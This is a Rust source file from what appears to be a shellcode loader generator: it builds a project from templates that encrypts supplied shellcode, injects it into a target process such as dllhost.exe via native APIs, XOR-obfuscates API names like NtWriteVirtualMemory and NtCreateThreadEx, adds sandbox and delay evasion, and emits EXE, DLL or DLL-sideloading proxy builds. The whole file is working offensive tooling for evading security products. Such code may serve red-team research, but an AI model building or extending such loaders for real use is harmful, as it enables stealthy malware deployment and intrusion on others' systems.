use crate::order::{Order, OutputFormat};
use crate::sideload;
use crate::techniques::{self, BuildContext, Category};
use fs_extra::dir::{copy, CopyOptions};
use std::collections::HashMap;
use std::fs::{self, OpenOptions};
use std::io::prelude::*;
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};

use crate::tools::random_u8;

const OUTPUT_DIR: &str = "shared";

fn obfuscate_api_name(name: &str, key: u8) -> String {
    let bytes: Vec<String> = name.bytes().map(|b| format!("0x{:02x}", b ^ key)).collect();
    format!("[{}]", bytes.join(", "))
}

fn non_zero_random_key() -> u8 {
    loop { let k = random_u8(); if k != 0 { return k; } }
}

fn search_and_replace(path: &Path, search: &str, replace: &str) -> Result<(), Box<dyn std::error::Error>> {
    let file_content = fs::read_to_string(path)?;
    let new_content = file_content.replace(search, replace);
    let mut file = OpenOptions::new().write(true).truncate(true).open(path)?;
    file.write_all(new_content.as_bytes())?;
    Ok(())
}

fn create_root_folder(parent: &Path) -> Result<PathBuf, Box<dyn std::error::Error>> {
    let timestamp = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs();
    let folder_name = format!("output_{}", timestamp);
    crate::blog!("[+] Creating output folder: {}", &folder_name);
    let result_path = parent.join(folder_name);
    fs::create_dir_all(&result_path)?;
    Ok(result_path)
}

fn copy_template(source: &Path, dest: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let options = CopyOptions { content_only: true, ..Default::default() };
    copy(source, dest, &options)?;
    Ok(())
}

fn default_replacements(order: &Order) -> HashMap<&'static str, String> {
    let mut r: HashMap<&'static str, String> = HashMap::new();
    r.insert("{{TARGET_PROCESS}}", "dllhost.exe".to_string()); // overwritten by injection.apply()
    r.insert("{{SANDBOX}}", String::new());
    r.insert("{{SANDBOX_IMPORTS}}", String::new());
    r.insert("{{DLL_MAIN}}", String::new());
    r.insert("{{DLL_FORMAT}}", String::new());
    r.insert("{{INJECTION_HELPERS}}", String::new());
    r.insert("{{CALLBACK_INVOKE}}", String::new());

    // nt_delay evasion placeholders — empty unless the evasion is enabled.
    r.insert("{{NT_DELAY_AT_START}}", String::new());
    r.insert("{{NT_DELAY_STEP}}", String::new());
    r.insert("{{NT_DELAY_FINAL}}", String::new());

    let api_key = non_zero_random_key();
    r.insert("{{API_KEY}}", format!("0x{:02x}", api_key));
    r.insert("{{OBF_NT_OPEN_PROCESS}}", obfuscate_api_name("NtOpenProcess", api_key));
    r.insert("{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}}", obfuscate_api_name("NtAllocateVirtualMemory", api_key));
    r.insert("{{OBF_NT_WRITE_VIRTUAL_MEMORY}}", obfuscate_api_name("NtWriteVirtualMemory", api_key));
    r.insert("{{OBF_NT_PROTECT_VIRTUAL_MEMORY}}", obfuscate_api_name("NtProtectVirtualMemory", api_key));
    r.insert("{{OBF_NT_CREATE_THREAD_EX}}", obfuscate_api_name("NtCreateThreadEx", api_key));
    r.insert("{{OBF_NT_QUEUE_APC_THREAD}}", obfuscate_api_name("NtQueueApcThread", api_key));
    r.insert("{{OBF_NT_TEST_ALERT}}", obfuscate_api_name("NtTestAlert", api_key));
    r.insert("{{OBF_NT_DELAY_EXECUTION}}", obfuscate_api_name("NtDelayExecution", api_key));

    let _ = order; // reserved for future per-order defaults
    r
}

fn apply_dll_format(replacements: &mut HashMap<&'static str, String>, main_rs_path: &Path) -> PathBuf {
    let dll_cargo_conf = "[lib]\ncrate-type = [\"cdylib\"]";
    replacements.insert("{{DLL_FORMAT}}", dll_cargo_conf.to_string());

    let dll_main_fn = r#"
const DLL_PROCESS_ATTACH: u32 = 1;
const DLL_PROCESS_DETACH: u32 = 0;

#[no_mangle]
#[allow(non_snake_case, unused_variables, unreachable_patterns)]
extern "system" fn DllMain(dll_module: usize, call_reason: u32, _: *mut ()) -> bool {
    match call_reason {
        DLL_PROCESS_ATTACH => (),
        DLL_PROCESS_DETACH => (),
        _ => ()
    }
    true
}
#[no_mangle] pub extern "C" fn DllRegisterServer()   { main() }
#[no_mangle] pub extern "C" fn DllGetClassObject()   { main() }
#[no_mangle] pub extern "C" fn DllUnregisterServer() { main() }
#[no_mangle] pub extern "C" fn Run()                 { main() }
"#;
    replacements.insert("{{DLL_MAIN}}", dll_main_fn.to_string());

    let lib_rs_path = main_rs_path.with_file_name("lib.rs");
    if let Err(e) = fs::rename(main_rs_path, &lib_rs_path) {
        panic!("Error while renaming main.rs to lib.rs: {}", e);
    }
    lib_rs_path
}

/// DllSideload format: the chosen self-injection technique's `main()` becomes the body
/// of the hijacked export. DllMain is a passthrough. Proxy mode forwards non-hijacked
/// exports to the original DLL via a `.def` file.
fn apply_sideload_format(
    replacements: &mut HashMap<&'static str, String>,
    main_rs_path: &Path,
    folder: &Path,
    config: &crate::order::SideloadConfig,
) -> PathBuf {
    if let Err(e) = sideload::apply(config, folder, replacements) {
        panic!("Sideload generation failed: {e}");
    }

    let lib_rs_path = main_rs_path.with_file_name("lib.rs");
    if let Err(e) = fs::rename(main_rs_path, &lib_rs_path) {
        panic!("Error while renaming main.rs to lib.rs: {}", e);
    }
    lib_rs_path
}

fn apply_replacements(replacements: &HashMap<&'static str, String>, main_path: &Path, cargo_path: &Path) {
    for (key, value) in replacements {
        search_and_replace(main_path, key, value)
            .unwrap_or_else(|e| crate::blog!("[!] Warning: template replace failed for {}: {}", key, e));
        search_and_replace(cargo_path, key, value)
            .unwrap_or_else(|e| crate::blog!("[!] Warning: cargo replace failed for {}: {}", key, e));
    }
}

pub fn assemble(order: Order) -> PathBuf {
    crate::blog!("[+] Assembling Rust code..");

    let folder = create_root_folder(Path::new(OUTPUT_DIR)).expect("Failed to create output folder");
    let src_dir = folder.join("src");

    let mut ctx = BuildContext {
        shellcode_path: &order.shellcode_path,
        output_folder: folder.clone(),
        src_dir: src_dir.clone(),
        replacements: default_replacements(&order),
        template_choice: None,
        params: &order.params,
    };

    // 1. Injection technique picks the template + sets target_process.
    let inj = techniques::find(&order.injection_id)
        .unwrap_or_else(|| panic!("unknown injection: {}", order.injection_id));
    inj.apply(&mut ctx).expect("injection apply failed");

    let template_name = ctx.template_choice.expect("injection did not set template");
    let template_path = PathBuf::from("templates").join(template_name).join(".");
    copy_template(&template_path, &folder).expect("Failed to copy template");

    // 2. Encryption technique writes the encrypted file + decryption replacements.
    let enc = techniques::find(&order.encryption_id)
        .unwrap_or_else(|| panic!("unknown encryption: {}", order.encryption_id));
    enc.apply(&mut ctx).expect("encryption apply failed");

    // 3. Each enabled evasion technique adds its replacements.
    for ev_id in &order.evasions {
        let ev = techniques::find(ev_id)
            .unwrap_or_else(|| panic!("unknown evasion: {}", ev_id));
        ev.apply(&mut ctx).expect("evasion apply failed");
    }

    let main_rs = src_dir.join("main.rs");
    let cargo_toml = folder.join("Cargo.toml");

    let target_file = match order.format {
        OutputFormat::Exe => main_rs,
        OutputFormat::Dll => apply_dll_format(&mut ctx.replacements, &main_rs),
        OutputFormat::DllSideload => {
            let config = order
                .sideload
                .as_ref()
                .expect("DllSideload format requires a SideloadConfig in the Order");
            apply_sideload_format(&mut ctx.replacements, &main_rs, &folder, config)
        }
    };

    apply_replacements(&ctx.replacements, &target_file, &cargo_toml);

    // Sanity check
    let _ = Category::Encryption; // imported above, ensures `techniques` is in scope

    crate::blog!("[+] Done assembling Rust code!");
    folder
}
